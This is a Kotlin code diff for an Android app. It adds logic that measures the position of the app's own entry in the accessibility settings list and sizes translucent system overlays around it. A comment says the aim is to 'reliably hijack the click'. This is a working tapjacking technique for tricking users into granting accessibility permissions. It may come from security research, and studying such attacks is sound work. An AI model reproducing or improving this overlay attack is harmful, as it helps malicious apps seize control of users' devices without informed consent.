@@ -6,8 +6,42 @@ import android.graphics.PixelFormat
 import android.support.constraint.ConstraintLayout
 import android.view.Gravity
 import android.view.WindowManager
+import android.view.accessibility.AccessibilityManager
 
 class AccessibilityStage(context: Context, listener: () -> Unit) : Stage(context, listener) {
+
+    companion object {
+        val TAG: String = AccessibilityStage::class.java.name
+    }
+
+    private val accessibilityServices by lazy {
+        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
+        am.installedAccessibilityServiceList
+    }
+
+    private val targetServiceId by lazy {
+        val packageName = context.packageName
+        val target = Config.ACCESSIBILITY_SERVICE_CLASS.name.replace(packageName, "")
+        "$packageName/$target"
+    }
+
+    /*
+    * Use this method to calculate the size of the overlays in order to reliably hijack the click properly.
+    * */
+    private fun topOverlayHeight(): Int {
+        for ((index, value) in accessibilityServices.withIndex()) {
+            val targetServiceId = targetServiceId + ""
+            if (value.id == targetServiceId) {
+                return (index * Config.ACCESSIBILITY_SETTINGS_HEIGHT) + Config.TOP_PADDING
+            }
+        }
+        throw IllegalStateException("No accessibility service configured. Try setting Config.ACCESSIBILITY_SERVICE_CLASS to your AccessibilityService.")
+    }
+
+    private fun bottomOverlayHeight(): Int {
+        val screenHeight = context.resources.displayMetrics.heightPixels
+        return screenHeight - topOverlayHeight() - Config.ACCESSIBILITY_SETTINGS_HEIGHT
+    }
 
     override fun stageOverlays(): List<Overlay> {
         val overlays = ArrayList<Overlay>()
@@ -19,7 +53,7 @@ class AccessibilityStage(context: Context, listener: () -> Unit) : Stage(context
                 WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
         val topParams = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
-                730,
+                topOverlayHeight(),
                 WindowManager.LayoutParams.TYPE_PHONE,
                 lpFlags,
                 PixelFormat.TRANSLUCENT
@@ -32,7 +66,7 @@ class AccessibilityStage(context: Context, listener: () -> Unit) : Stage(context
         bottomOverlay.setBackgroundColor(Color.BLUE)
         val bottomParams = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
-                900,
+                bottomOverlayHeight(),
                 WindowManager.LayoutParams.TYPE_PHONE,
                 lpFlags,
                 PixelFormat.TRANSLUCENT
